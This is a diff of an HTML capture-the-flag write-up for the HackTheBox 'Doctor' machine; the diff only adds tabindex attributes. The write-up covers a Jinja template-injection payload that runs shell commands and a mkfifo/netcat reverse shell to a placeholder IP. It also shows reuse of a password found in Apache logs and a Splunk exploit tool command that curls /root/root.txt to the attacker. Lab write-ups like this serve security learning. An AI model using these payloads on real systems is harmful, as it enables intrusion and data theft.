@@ -209,7 +209,7 @@ basically means we need to run a port scan to get that information and this is a
 <code>nmap</code> with the <code>-sV</code>.  The <code>-sV</code> flag simply tells <code>nmap</code> to probe the open ports to gather the
 service and version information.</p>
 <p>Let&rsquo;s see what we got.</p>
-<pre><code>$ nmap -sV 10.10.10.209
+<pre tabindex="0"><code>$ nmap -sV 10.10.10.209
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-24 21:31 EDT
 Nmap scan report for 10.10.10.209
 Host is up (0.027s latency).
@@ -234,7 +234,7 @@ This enumerates directories used by popular web applications or frameworks to fi
 also identifies common directories that can contain interesting files hosted on the web server.
 This is achieved by using the<br>
 <a href="https://nmap.org/nsedoc/scripts/http-enum.html"><code>--script=http-enum</code></a> flag with <code>nmap</code>.</p>
-<pre><code>$ nmap -sV --script=http-enum 10.10.10.209
+<pre tabindex="0"><code>$ nmap -sV --script=http-enum 10.10.10.209
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-24 21:43 EDT
 Nmap scan report for 10.10.10.209
 Host is up (0.031s latency).
@@ -271,7 +271,7 @@ web browser doesn&rsquo;t bring up much: a simple, static site where every page 
 <p>I&rsquo;ll be honest, I spent way more time poking around than I&rsquo;d like to admit. Let&rsquo;s have a look at
 the header while requesting the static content.</p>
 <p>Using a basic <code>curl</code> command yields these results</p>
-<pre><code>$ curl -vvv http://10.10.10.209:80/
+<pre tabindex="0"><code>$ curl -vvv http://10.10.10.209:80/
 *   Trying 10.10.10.209:80...
 * Connected to 10.10.10.209 (10.10.10.209) port 80 (#0)
 &gt; GET / HTTP/1.1
@@ -296,7 +296,7 @@ giving up, I noticed an email in the contact information section. The &ldquo;sen
 <p><img src="/img/htb-doctor/email.png" alt=""></p>
 <p>At wit&rsquo;s end, I passed <code>doctors.htb</code> as the host in my request header by using the
 <code>--header &quot;Host: doctors.htb&quot;</code> flag with <code>curl</code>.</p>
-<pre><code>$ curl -vvv http://10.10.10.209:80/ --header &quot;Host: doctors.htb&quot;
+<pre tabindex="0"><code>$ curl -vvv http://10.10.10.209:80/ --header &quot;Host: doctors.htb&quot;
 *   Trying 10.10.10.209:80...
 * Connected to 10.10.10.209 (10.10.10.209) port 80 (#0)
 &gt; GET / HTTP/1.1
@@ -329,7 +329,7 @@ configured to host multiple web sites based on domains and leverage the host hea
 request to know which site to serve up to the client. Apache has
 <a href="https://httpd.apache.org/docs/2.4/vhosts/examples.html">documentation</a> on how to set this up.</p>
 <p>Adding the following entry to the <code>/etc/hosts</code> file</p>
-<pre><code>10.10.10.209	doctors.htb
+<pre tabindex="0"><code>10.10.10.209	doctors.htb
 </code></pre><p>makes it possible to use <code>doctors.htb</code> to reach the <code>doctor</code> box. For more information on the
 <code>/etc/hosts</code>, look up &ldquo;local DNS&rdquo; in your favorite search engine.</p>
 <p>By surfing to <code>http://doctors.htb</code>, we are leveraging this addition and our browser will use
@@ -359,7 +359,7 @@ This is not the case here. Python is just taking the input and showing it as-is.
 <p>This part also took me more time than I&rsquo;d like to admit. Sometimes the clues are right under your
 nose. If we dig through the source code of the forum, you will find the following at the top of
 the body section</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;collapse navbar-collapse&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;navbarToggle&#34;</span>&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;collapse navbar-collapse&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;navbarToggle&#34;</span>&gt;
 	&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;navbar-nav mr-auto&#34;</span>&gt;
 		&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;nav-item nav-link&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/home&#34;</span>&gt;Home&lt;/<span style="color:#f92672">a</span>&gt;
 		<span style="color:#75715e">&lt;!--archive still under beta testing&lt;a class=&#34;nav-item nav-link&#34; href=&#34;/archive&#34;&gt;Archive&lt;/a&gt;--&gt;</span>
@@ -369,7 +369,7 @@ the body section</p>
 a blank page. Looking at the response through our browser&rsquo;s dev tools, we see that it contains the
 titles of the messages we created in the forum earlier and that the injection recon we tried
 (<code>{{ 7*7 }}</code>) is actually computed (<code>&lt;title&gt;49&lt;/title&gt;</code>)</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;</span>
 <span style="color:#f92672">&lt;rss</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;2.0&#34;</span><span style="color:#f92672">&gt;</span>
 <span style="color:#f92672">&lt;channel&gt;</span>
 <span style="color:#f92672">&lt;title&gt;</span>Archive<span style="color:#f92672">&lt;/title&gt;</span>
@@ -385,7 +385,7 @@ titles of the messages we created in the forum earlier and that the injection re
 </code></pre></div><p>This computation is enough to know that the templating engine is parsing the injection as valid
 directives and executing it as Python code. It&rsquo;s time to see if we can get it to execute something
 on the command line through Python directives. The payload would look something like this:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">{{request<span style="color:#f92672">.</span>application<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>__builtins__<span style="color:#f92672">.</span>__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;whoami; id&#39;</span>)<span style="color:#f92672">.</span>read()}}
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">{{request<span style="color:#f92672">.</span>application<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>__builtins__<span style="color:#f92672">.</span>__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;whoami; id&#39;</span>)<span style="color:#f92672">.</span>read()}}
 </code></pre></div><p>Let&rsquo;s not go into crazy detail about this but what we&rsquo;re doing is requesting, through Python, that
 the remote machine executes the <code>whoami</code> and <code>id</code> shell commands. <code>whoami</code> informs us who the
 commands is being executed as (the user that is used to run the service on the server) and the
@@ -394,7 +394,7 @@ commands is being executed as (the user that is used to run the service on the s
 <a href="https://stackabuse.com/pythons-os-and-subprocess-popen-commands/">popen</a> documentation if you want
 to dig deeper into the popen function used to run shell commands.</p>
 <p>After adding that injection, we can browse back to the <code>/archive</code> endpoint to see the results</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;</span>
 &lt;<span style="color:#f92672">rss</span> <span style="color:#a6e22e">version</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;2.0&#34;</span>&gt;
 &lt;<span style="color:#f92672">channel</span>&gt;
 &lt;<span style="color:#f92672">title</span>&gt;Archive&lt;/<span style="color:#f92672">title</span>&gt;
@@ -412,7 +412,7 @@ to dig deeper into the popen function used to run shell commands.</p>
 &lt;/<span style="color:#f92672">title</span>&gt;&lt;/<span style="color:#f92672">item</span>&gt;
 &lt;/<span style="color:#f92672">channel</span>&gt;
 </code></pre></div><p>Here&rsquo;s the part in the response that is of interest:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">		&lt;/<span style="color:#f92672">channel</span>&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">		&lt;/<span style="color:#f92672">channel</span>&gt;
 		&lt;<span style="color:#f92672">item</span>&gt;&lt;<span style="color:#f92672">title</span>&gt; web
 		uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
 </code></pre></div><p>The result is the output of our <code>whoami; id</code> command.  So now we know that we can run some shell
@@ -425,14 +425,14 @@ the process of moving out of our low privileged user (<code>web</code> in this c
 <p>Using the SSTI method outlined above, we can now try our hand at a reverse shell. Starting with <code>nc</code>
 (<a href="https://en.wikipedia.org/wiki/Netcat">netcat</a>) and using the most common method, I couldn&rsquo;t obtain
 successful results. Here&rsquo;s what the payload would have looked like</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">{{request<span style="color:#f92672">.</span>application<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>__builtins__<span style="color:#f92672">.</span>__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;nc -e /usr/bin/sh &lt;ip&gt; 4545&#39;</span>)<span style="color:#f92672">.</span>read()}}
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">{{request<span style="color:#f92672">.</span>application<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>__builtins__<span style="color:#f92672">.</span>__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;nc -e /usr/bin/sh &lt;ip&gt; 4545&#39;</span>)<span style="color:#f92672">.</span>read()}}
 </code></pre></div><p>By the way, <code>&lt;ip&gt;</code> should be replaced with our machine&rsquo;s IP address on the HackTheBox.eu network.
 Then, on our machine, we would have executed the following netcat command</p>
-<pre><code>nc -lvp 4545
+<pre tabindex="0"><code>nc -lvp 4545
 </code></pre><p>As stated above, I wasn&rsquo;t able to get netcat to execute <code>/usr/bin/sh</code> so I couldn&rsquo;t get the remote
 machine to connect to mine and get the reverse shell. We&rsquo;re going to have to resort to some bash-fu
 and a little bit of sorcery. Let&rsquo;s look at this alternative</p>
-<pre><code>rm /tmp/asd;mkfifo /tmp/asd;cat /tmp/asd|/usr/bin/sh -i 2&gt;&amp;1|nc &lt;ip&gt; 4545 &gt;/tmp/asd
+<pre tabindex="0"><code>rm /tmp/asd;mkfifo /tmp/asd;cat /tmp/asd|/usr/bin/sh -i 2&gt;&amp;1|nc &lt;ip&gt; 4545 &gt;/tmp/asd
 </code></pre><p>This creates a kind of feedback loop that whatever is received by netcat gets written
 into the <code>/tmp/asd</code> file (<code>nc &lt;ip&gt; 4545 &gt;/tmp/asd</code>) which in turn gets piped into <code>/usr/bin/sh</code>
 (<code>cat /tmp/asd|/usr/bin/sh -i 2&gt;&amp;1</code>). The <code>2&gt;&amp;1</code> simply tells the system to redirect
@@ -446,7 +446,7 @@ command to execute whatever we just sent it.</p>
 startng point if you&rsquo;re curious about the redirection and piping mysticism in the above string of
 commands.</p>
 <p>This new revised command grants us the reverse shell we are after.</p>
-<pre><code>$ nc -lvp 4545
+<pre tabindex="0"><code>$ nc -lvp 4545
 Connection from 10.10.10.209:47142
 /usr/bin/sh: 0: can't access tty; job control turned off
 $ ls -la
@@ -474,7 +474,7 @@ netcat on the remote machine. Let&rsquo;s go catch that user flag!</p>
 <p>Now that we have a shell, let&rsquo;s go snooping around to find a way to elevate our privileges and get
 the user flag. We will be engaging in some basic recon work and some looking around. One good
 first step would be to find out who the target user is.</p>
-<pre><code>$ ls /home
+<pre tabindex="0"><code>$ ls /home
 shaun
 web
 $ ls -l /home/shaun
@@ -499,7 +499,7 @@ for passwords, failed authentication attemps, errors, that sort of thing.</p>
 matches our search criteria of <code>password</code>. Not shown here since it would take up a good amount of
 space, but the number of matches was pretty large. Spending a good amount of time looking at the
 matches payed off as the following line struck my curiosity nerve:</p>
-<pre><code>$ grep -r -i &quot;password&quot; /var/log
+<pre tabindex="0"><code>$ grep -r -i &quot;password&quot; /var/log
 ...
 /var/log/apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] &quot;POST /reset_password?email=Guitar123&quot; 500 453 &quot;http://doctor.htb/reset_password&quot;
 ...
@@ -513,14 +513,14 @@ password someone might use. This is an other instance where a lot of time was sp
 information and ending up trying trivial and desperate things to progress to the next point.</p>
 <p>If we try <code>su</code>-ing into <code>shaun</code>, we get asked for his password. At this point, we&rsquo;re desperate
 again so let&rsquo;s try <code>Guitar123</code>.</p>
-<pre><code>$ su shaun
+<pre tabindex="0"><code>$ su shaun
 Password: Guitar123
 whoami
 shaun
 id
 uid=1002(shaun) gid=1002(shaun) groups=1002(shaun)
 </code></pre><p>Well&hellip; It worked&hellip; Let&rsquo;s stay collected and cat the <code>user.txt</code> file to obtain the user flag.</p>
-<pre><code>cat /home/shaun/user.txt
+<pre tabindex="0"><code>cat /home/shaun/user.txt
 7dfec0e6330b1ec2b10db9728217fb7e
 </code></pre><p>Well deserved. I&rsquo;ve stated this before but let&rsquo;s take some time to reflect on it again. Up until
 now, we haven&rsquo;t done any complex exploitation. We&rsquo;re using basic every-day commands and looking for
@@ -552,7 +552,7 @@ that explains the concept on how to exploit Splunk for shells and persistence.</
 <p>The reason why this is interesting and it can help us obtain <code>root</code> access is because the Splunk
 service is actually run by the <code>root</code> user. We can confirm this by using our
 <a href="#reverse-shell">reverse shell</a> and running <code>ps</code></p>
-<pre><code>$ ps aux | grep splunkd
+<pre tabindex="0"><code>$ ps aux | grep splunkd
 root        1143  0.1  2.3 265920 93044 ?        Sl   Nov07   0:02 splunkd -p 8089 start
 root        1145  0.0  0.3  77664 15700 ?        Ss   Nov07   0:00 [splunkd pid=1143] splunkd -p 8089 start [process-runner]
 web         1734  0.0  0.0  17668   656 ?        S    00:07   0:00 grep splunkd
@@ -560,11 +560,11 @@ web         1734  0.0  0.0  17668   656 ?        S    00:07   0:00 grep splunkd
 tool, all we have to do is set it up so that <code>PySplunkWhisperer2_remote</code> sends us the
 <code>/root/root.txt</code> file. Since we already validated that we can use <code>shaun</code>&rsquo;s credentials for Splunk,
 that&rsquo;s what we&rsquo;ll pump into <code>PySplunkWhisperer2</code> for the user name and password.</p>
-<pre><code>python PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --username shaun --password &quot;Guitar123&quot; --payload &quot;curl -F 'data=@/root/root.txt' http://&lt;ip&gt;:4545&quot; --lhost &lt;ip&gt;
+<pre tabindex="0"><code>python PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --username shaun --password &quot;Guitar123&quot; --payload &quot;curl -F 'data=@/root/root.txt' http://&lt;ip&gt;:4545&quot; --lhost &lt;ip&gt;
 </code></pre><p>In the above command, as previously stated, <code>&lt;ip&gt;</code> has to be replaced with your machine&rsquo;s IP address
 on the HackTheBox.eu network. We also need to setup netcat to receive the content with the following
 command</p>
-<pre><code>$ nc -lvp 4545
+<pre tabindex="0"><code>$ nc -lvp 4545
 Connection from 10.10.10.209:56646
 POST / HTTP/1.1
 Host: 10.10.15.9:4545
